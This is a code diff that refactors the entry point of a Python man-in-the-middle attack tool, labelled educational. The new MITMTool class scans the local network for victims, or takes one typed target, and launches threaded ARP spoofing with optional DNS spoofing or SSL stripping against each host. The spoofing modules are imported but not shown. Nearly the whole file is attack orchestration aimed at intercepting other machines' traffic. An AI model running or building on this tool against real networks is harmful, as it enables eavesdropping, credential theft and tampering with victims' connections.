@@ -2,61 +2,101 @@
 
 import argparse
 import sys
+import time
 import threading
+from typing import List, Optional
 from modules.arp_spoof import ARPSpoofer
 from modules.dns_spoof import DNSSpoofer
 from modules.ssl_strip import SSLStripper
+from modules.network_discovery import NetworkScanner
 
-def parse_arguments():
+class MITMTool:
+    def __init__(self, interface: str, gateway: str, attack_type: str, manual_mode: bool = False):
+        self.interface = interface
+        self.gateway = gateway
+        self.attack_type = attack_type
+        self.manual_mode = manual_mode
+        self.threads: List[threading.Thread] = []
+        self.spoofers: List[ARPSpoofer | DNSSpoofer] = []
+
+    def setup_targets(self) -> List[str]:
+        """Setup target IPs based on mode selection."""
+        scanner = NetworkScanner(self.gateway, self.interface)
+        scanner.start()
+        
+        if self.manual_mode:
+            return [input('Pick a target IP: ')]
+        return scanner.victim_list
+
+    def create_spoofer(self, target: str) -> None:
+        """Create and start appropriate spoofer based on attack type."""
+        if target == self.gateway:
+            return
+
+        # ARP spoofing is always performed as it's the foundation
+        arp_spoofer = ARPSpoofer(self.interface, target, self.gateway)
+        self.spoofers.append(arp_spoofer)
+        self._start_thread(arp_spoofer.start)
+
+        if self.attack_type == 'dns':
+            dns_spoofer = DNSSpoofer(self.interface, target, self.gateway)
+            self.spoofers.append(dns_spoofer)
+            self._start_thread(dns_spoofer.start)
+
+        if self.attack_type == 'ssl':
+            ssl_spoofer = SSLStripper(self.interface, target, self.gateway)
+            self.spoofers.append(ssl_spoofer)
+            self._start_thread(ssl_spoofer.start)
+
+    def _start_thread(self, target_func) -> None:
+        """Helper method to create and start a thread."""
+        thread = threading.Thread(target=target_func)
+        self.threads.append(thread)
+        thread.start()
+
+    def cleanup(self) -> None:
+        """Cleanup resources and stop all spoofers."""
+        print("\n[*] Shutting down all spoofers...")
+        for spoofer in self.spoofers:
+            spoofer.stop()
+        for thread in self.threads:
+            thread.join()
+        print("\n[*] Shutting down MITM tool...")
+
+    def run(self) -> None:
+        """Main execution method."""
+        targets = self.setup_targets()
+        for target in targets:
+            self.create_spoofer(target)
+
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            self.cleanup()
+            sys.exit(0)
+
+def parse_arguments() -> argparse.Namespace:
+    """Parse command line arguments."""
     parser = argparse.ArgumentParser(description='MITM Tool for Educational Purposes')
+    parser.add_argument('-m', '--mode', action='store_true',
+                      help='Manual mode: select target instead of scanning all hosts')
     parser.add_argument('-i', '--interface', required=True, help='Network interface to use')
-    parser.add_argument('-t', '--target', required=True, help='Target IP address')
     parser.add_argument('-g', '--gateway', required=True, help='Gateway IP address')
     parser.add_argument('-p', '--port', type=int, default=8080, help='Port for SSL stripping proxy (default: 8080)')
-    parser.add_argument('-m', '--mode', choices=['arp', 'dns', 'ssl', 'all'], 
-                      default='all', help='Attack mode to use')
+    parser.add_argument('-t', '--type', choices=['arp', 'dns', 'ssl'], 
+                      default='arp', help='Attack type to use')
     return parser.parse_args()
 
-def main():
+def main() -> None:
     args = parse_arguments()
-    attackers = []
-    
-    try:
-        # Initialize attackers based on mode
-        if args.mode in ['arp', 'all']:
-            arp_spoofer = ARPSpoofer(args.interface, args.target, args.gateway)
-            attackers.append(('ARP Spoofer', arp_spoofer))
-            
-        if args.mode in ['dns', 'all']:
-            dns_spoofer = DNSSpoofer()  # TODO: Implement DNS Spoofing
-            attackers.append(('DNS Spoofer', dns_spoofer))
-            
-        if args.mode in ['ssl', 'all']:
-            ssl_stripper = SSLStripper(args.interface, args.port)
-            attackers.append(('SSL Stripper', ssl_stripper))
-
-        # Start all attackers in separate threads
-        threads = []
-        for name, attacker in attackers:
-            print(f"[*] Starting {name}...")
-            thread = threading.Thread(target=attacker.start)
-            thread.daemon = True
-            thread.start()
-            threads.append((name, thread))
-            
-        print("\n[+] All attacks started. Press Ctrl+C to stop.")
-        
-        # Keep the main thread alive
-        for _, thread in threads:
-            thread.join()
-            
-    except KeyboardInterrupt:
-        print("\n[*] Shutting down MITM tool...")
-        # Stop all attackers
-        for name, attacker in attackers:
-            print(f"[*] Stopping {name}...")
-            attacker.stop()
-        sys.exit(0)
+    tool = MITMTool(
+        interface=args.interface,
+        gateway=args.gateway,
+        attack_type=args.type,
+        manual_mode=args.mode
+    )
+    tool.run()
 
 if __name__ == "__main__":
-    main() 
+    main()
